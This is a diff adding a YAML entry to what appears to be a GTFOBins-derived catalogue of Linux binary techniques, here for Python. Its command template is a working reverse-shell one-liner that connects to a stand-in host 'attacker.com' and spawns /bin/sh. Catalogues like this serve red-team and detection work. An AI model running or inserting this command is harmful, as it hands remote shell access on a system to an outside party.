@@ -1,0 +1,30 @@
+id: gtfobins/python/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: python
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'python -c ''import sys,socket,os,pty;s=socket.socket()
+
+    s.connect(("attacker.com",12345))
+
+    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+
+    pty.spawn("/bin/sh")'''
+references:
+- https://gtfobins.github.io/gtfobins/python/
+tags:
+- linux
+- unix
+- gtfobins
